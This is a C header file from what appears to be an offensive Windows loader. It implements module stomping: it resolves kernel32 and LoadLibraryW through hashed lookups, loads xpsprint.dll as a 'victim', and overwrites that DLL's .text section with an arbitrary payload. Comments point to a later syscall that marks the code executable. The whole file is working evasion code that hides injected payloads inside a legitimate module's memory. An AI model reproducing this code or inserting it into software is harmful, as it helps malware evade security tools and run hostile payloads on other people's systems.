#pragma once
#include <windows.h>
#include "helpers.h"

// Example hashes
#define HASH_KERNEL32          0x9C4928C0
#define HASH_LOADLIBRARYW      0x8BC82B5C
#define HASH_XPSPRINT          0x6757EB22

/**
 * Performs Module Stomping by overwriting the .text section of a legitimate DLL.
 * cha chanta.dll
 */
static BOOL PerformModuleStomping(LPVOID pPayload, SIZE_T sPayloadSize, LPVOID* ppExecAddr) {
    
    // 1. Resolve LoadLibraryW via custom helpers
    typedef HMODULE(WINAPI* fnLoadLibraryW)(LPCWSTR);
    
    HMODULE hKernel32 = HlpGetModuleHandle(HASH_KERNEL32, 0x73DA31CB);
    if (!hKernel32) return FALSE;

    fnLoadLibraryW pLoadLibraryW = (fnLoadLibraryW)HlpGetProcAddress(
        hKernel32, 
        HASH_LOADLIBRARYW, 
        0x73DA31CB
    );
    if (!pLoadLibraryW) return FALSE;

    // 2. Load the target "victim" DLL
    // Check if it's already loaded first, otherwise load it.
    HMODULE hVictimDll = HlpGetModuleHandle(HASH_XPSPRINT, 0x73DA31CB);
    if (!hVictimDll) {
        hVictimDll = pLoadLibraryW(L"xpsprint.dll");
    }
    
    if (!hVictimDll) return FALSE;

    // 3. Navigate the PE header to locate the .text section
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hVictimDll;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)hVictimDll + pDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHdr = IMAGE_FIRST_SECTION(pNtHdr);
    
    PVOID pTargetAddr = NULL;

    for (WORD i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++) {
        // Look for the executable code section (.text)
        if (MemoryCompare((PCHAR)pSectionHdr[i].Name, (PCHAR)".text", 5)) {
            pTargetAddr = (PVOID)((PBYTE)hVictimDll + pSectionHdr[i].VirtualAddress);
            
            // Safety check: Ensure payload fits within the section size
            if (sPayloadSize > pSectionHdr[i].Misc.VirtualSize) {
                return FALSE; 
            }
            break;
        }
    }

    if (!pTargetAddr) return FALSE;

    // 4. Overwrite the section (The "Stomp")
    DWORD dwOldProtect;
    
    // Temporarily change protection to RW to allow the copy
    if (VirtualProtect(pTargetAddr, sPayloadSize, PAGE_READWRITE, &dwOldProtect)) {
        
        RtlCopyMemory(pTargetAddr, pPayload, sPayloadSize);
        
        // Restore original protection (usually RX)
        // main.c will later use a syscall to enforce PAGE_EXECUTE_READ specifically
        VirtualProtect(pTargetAddr, sPayloadSize, dwOldProtect, &dwOldProtect);
        
        *ppExecAddr = pTargetAddr;
        return TRUE;
    }

    return FALSE;
}